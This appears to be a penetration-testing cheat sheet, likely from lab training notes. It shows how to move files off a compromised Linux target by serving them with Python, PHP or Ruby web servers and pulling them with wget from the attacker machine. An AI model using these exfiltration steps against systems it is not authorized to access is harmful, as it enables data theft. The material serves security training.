When you need a **fast, no-frills way** to transfer files from a **compromised machine (target)** to your **attacker box (Pwnbox)**, Linux often has built-in tools to make it easy.

---

## **1. Start a Web Server on the Target Machine**

### **A. Python 3**

If Python 3 is installed on the **target**:

```bash
python3 -m http.server
```

Output:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

---

### **B. Python 2.7 (Legacy)**

If Python 2 is installed:

```bash
python2.7 -m SimpleHTTPServer
```

---

### **C. PHP**

If PHP is installed:

```bash
php -S 0.0.0.0:8000
```

Output:

```
PHP Development Server started at http://0.0.0.0:8000
```

---

### **D. Ruby**

If Ruby is installed:

```bash
ruby -run -ehttpd . -p8000
```

Output:

```
WEBrick HTTPServer running on port 8000
```

---

## **2. Download the File (Attacker Machine)**

On your **attacker (Pwnbox)**, pull the file:

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

Output:

```
Saving to: 'filetotransfer.txt'
filetotransfer.txt saved [0/0]
```

---

## **3. Notes**

- These methods are **download-only**: they let you pull files **from the target to your machine**, not upload to the target.
    
- Make sure port **8000** (or whichever you use) is **reachable**; firewalls may block inbound connections.
    
- Change the port if 8000 is in use:
    

```bash
python3 -m http.server 9001
```
